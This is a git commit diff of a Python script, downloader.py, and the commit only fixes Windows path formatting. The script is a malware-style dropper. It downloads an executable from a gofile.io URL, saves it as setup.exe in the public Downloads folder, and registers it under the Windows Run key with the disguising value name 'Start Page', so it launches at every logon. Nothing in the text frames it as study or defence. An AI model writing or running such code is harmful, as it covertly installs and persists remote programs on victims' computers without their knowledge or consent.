07c44c337b95b287ca12a852770a254cf880857c
rocheandley <rocheandley@gmail.com>
2020-09-27 23:23:32 +0200

    fixed path issues

--- downloader.py
+++ downloader.py
@@ -3,7 +3,7 @@ import winreg
 
 
 url = "https://srv-file21.gofile.io/downloadStore/srv-store4/maAhtT/main.exe"
-wget.download(url, 'c:/users/public/downloads/setup.exe')
+wget.download(url, r'C:\users\Public\Downloads\setup.exe')
 
 
 keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
@@ -11,11 +11,6 @@ try:
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
 except:
     key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
-winreg.SetValueEx(key, "Start Page", 0, winreg.REG_SZ, r'c:/users/public/downloads/setup.exe')
+winreg.SetValueEx(key, "Start Page", 0, winreg.REG_SZ, r'C:\Users\Public\Downloads\setup.exe')
 winreg.CloseKey(key)
 
-#
-# def write(path, value, root=HKEY_CURRENT_USER):
-#     path, name = os.path.split(path)
-#     with OpenKey(root, path, 0, KEY_WRITE) as key:
-#         SetValueEx(key, name, 0, REG_SZ, value)
